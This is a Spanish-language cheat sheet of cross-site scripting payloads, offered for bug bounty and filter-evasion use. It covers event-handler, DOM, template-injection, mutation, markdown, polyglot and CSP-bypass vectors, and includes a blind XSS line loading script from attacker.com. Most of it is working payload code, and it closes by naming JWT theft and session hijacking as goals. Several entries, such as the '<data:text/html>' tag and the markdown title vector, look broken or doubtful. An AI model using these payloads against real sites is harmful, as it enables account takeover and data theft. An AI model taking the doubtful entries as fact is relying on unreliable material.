# Modern XSS Payloads (2025-2026)

Muchos payloads clásicos de XSS:
- ya no funcionan en Chrome moderno,
- fueron parchados,
- o solo funcionan en Internet Explorer/Edge Legacy.

Sin embargo, todavía existen payloads modernos que:
- funcionan en aplicaciones reales,
- aprovechan malas implementaciones frontend,
- bypass CSP débiles,
- explotan frameworks modernos,
- y afectan SPA/APIs modernas.

---

# 1. Modern Basic Payloads

## SVG onload

```html
<svg/onload=alert(1)>
```

### Estado actual
✅ Sigue funcionando en muchos escenarios.

### Muy usado en:
- chats,
- markdown,
- uploads SVG,
- previews,
- DOM XSS.

---

## IMG onerror

```html
<img src=x onerror=alert(1)>
```

### Estado actual
✅ Sigue siendo uno de los payloads más efectivos.

### Explicación
La imagen falla → se ejecuta `onerror`.

---

## iframe srcdoc

```html
<iframe srcdoc="<script>alert(1)</script>">
```

### Explicación
`srcdoc` permite renderizar HTML directamente dentro del iframe.

### Estado actual
✅ Muy útil en:
- WYSIWYG editors,
- markdown renderers,
- previews HTML.

---

# 2. DOM XSS Payloads

Hoy en día la mayoría de XSS modernos son DOM XSS.

---

## location.hash

```html
https://site.com/#<img src=x onerror=alert(1)>
```

### Explicación

Frontend vulnerable:

```javascript
element.innerHTML = location.hash;
```

---

## postMessage XSS

```javascript
window.addEventListener("message",(e)=>{
    eval(e.data)
})
```

Payload:

```javascript
window.postMessage("alert(1)","*")
```

### Estado actual
✅ Muy común en:
- microfrontends,
- widgets,
- integraciones externas.

---

## JSON Injection

Payload:

```json
{"name":"<img src=x onerror=alert(1)>"}
```

### Explicación

Muy común cuando:
- React/Vue renderizan datos inseguros,
- se usa dangerouslySetInnerHTML,
- o innerHTML.

---

# 3. CSP Bypass Payloads

Muchos sitios modernos tienen CSP.

Los atacantes buscan bypass.

---

## AngularJS Sandbox Bypass

```html
{{$on.constructor('alert(1)')()}}
```

### Explicación

Aprovecha AngularJS vulnerable.

### Estado actual
⚠️ Funciona principalmente en versiones viejas AngularJS.

---

## Vue Injection

```html
{{constructor.constructor('alert(1)')()}}
```

### Explicación

Abusa del motor de templates.

---

## React dangerous HTML

Código vulnerable:

```javascript
dangerouslySetInnerHTML={{__html:userInput}}
```

Payload:

```html
<img src=x onerror=alert(1)>
```

---

# 4. Mutation XSS (mXSS)

## Payload

```html
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
```

### Explicación

El navegador:
1. corrige HTML inválido,
2. muta el DOM,
3. termina ejecutando JavaScript.

### Estado actual
✅ Muy importante actualmente.

Especialmente en:
- sanitizadores defectuosos,
- DOMPurify mal configurado,
- parsers HTML custom.

---

# 5. Markdown XSS

## Payload

```markdown
![x](x "onerror=alert(1)")
```

---

## SVG Markdown

```markdown
![](data:image/svg+xml,<svg onload=alert(1)>)
```

### Estado actual
✅ Muy común en:
- plataformas markdown,
- chats,
- documentación,
- tickets.

---

# 6. data: URI Payloads

## Payload

```html
<data:text/html,<script>alert(1)</script>>
```

---

## iframe data URI

```html
<iframe src="data:text/html,<script>alert(1)</script>">
```

### Estado actual
⚠️ Depende CSP.

---

# 7. Modern Event Handlers

Muchos filtros bloquean:
- onload
- onclick

Pero olvidan otros.

---

## onanimationstart

```html
<style>@keyframes x{}</style>
<div style="animation-name:x" onanimationstart="alert(1)"></div>
```

### Estado actual
✅ Muy usado en bypass modernos.

---

## ontoggle

```html
<details open ontoggle=alert(1)>
```

### Explicación

Se ejecuta automáticamente.

---

## onpointerenter

```html
<div onpointerenter=alert(1)>test</div>
```

---

# 8. Autofocus XSS

## Payload

```html
<input autofocus onfocus=alert(1)>
```

### Explicación

No requiere interacción del usuario.

---

# 9. Template Literal Payloads

## Payload

```html
${alert(1)}
```

### Explicación

Afecta:
- template engines,
- SSR,
- Node.js renderers.

---

# 10. Polyglot Payloads

Funcionan en múltiples contextos.

---

## Gareth Heyes Polyglot

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1)//%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e
```

### Explicación

Puede ejecutar XSS en:
- HTML,
- atributos,
- JavaScript,
- URL,
- SVG.

### Muy usado en:
- bug bounty,
- bypass avanzados,
- WAF evasion.

---

# 11. Blind XSS

Payload típico:

```html
<script src=https://attacker.com/xss.js></script>
```

### Explicación

El payload:
- queda almacenado,
- y se ejecuta posteriormente en paneles administrativos.

### Muy usado en:
- bug bounty,
- soporte,
- CRM,
- dashboards internos.

---

# 12. CSP Nonce Reuse

Si una app reutiliza nonce:

```html
<script nonce="abc123">
```

Puede permitir:

```html
<script nonce="abc123">alert(1)</script>
```

---

# 13. DOM Clobbering

## Payload

```html
<form id=x></form>
<form id=x name=action></form>
```

### Explicación

Sobrescribe propiedades JavaScript del DOM.

### Estado actual
✅ Técnica moderna importante.

---

# 14. Modern SVG Payloads

## animate

```html
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

---

## foreignObject

```html
<svg>
<foreignObject>
<script>alert(1)</script>
</foreignObject>
</svg>
```

---

# 15. Service Worker XSS

## Payload conceptual

```javascript
navigator.serviceWorker.register('/xss.js')
```

### Impacto

Puede persistir incluso después de cerrar la pestaña.

---

# Técnicas Modernas Más Reales Actualmente

## Más vistas en bug bounty

### DOM XSS
✅ Muy común

---

### Markdown XSS
✅ Muy común

---

### SVG XSS
✅ Muy común

---

### React/Vue Injection
✅ Muy común

---

### Mutation XSS
✅ Muy importante

---

### CSP Bypass
✅ Muy buscado

---

# Payloads Más Efectivos Actualmente

## Universal básico

```html
<img src=x onerror=alert(1)>
```

---

## SVG moderno

```html
<svg/onload=alert(1)>
```

---

## Autofocus

```html
<input autofocus onfocus=alert(1)>
```

---

## Details toggle

```html
<details open ontoggle=alert(1)>
```

---

## iframe srcdoc

```html
<iframe srcdoc="<script>alert(1)</script>">
```

---

# Tendencias Modernas

Actualmente el XSS moderno se enfoca más en:

- DOM XSS,
- frontend frameworks,
- CSP bypass,
- sanitizers bypass,
- mutation XSS,
- markdown rendering,
- SVG rendering,
- third-party integrations.

Ya no tanto en:
- IE payloads,
- vbscript,
- livescript,
- dynsrc,
- legacy browser tricks.

---

# Recursos Modernos

## PortSwigger XSS Labs

https://portswigger.net/web-security/cross-site-scripting

---

## PayloadsAllTheThings

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

---

## OWASP XSS Prevention

https://owasp.org/www-community/xss-filter-evasion-cheatsheet

---

# Nota Final

Muchos payloads modernos:
- no buscan solamente ejecutar `alert(1)`,
- sino:
  - robar JWT,
  - secuestrar sesiones,
  - abusar APIs,
  - explotar SPAs,
  - persistir en dashboards,
  - o evadir CSP/WAF modernos.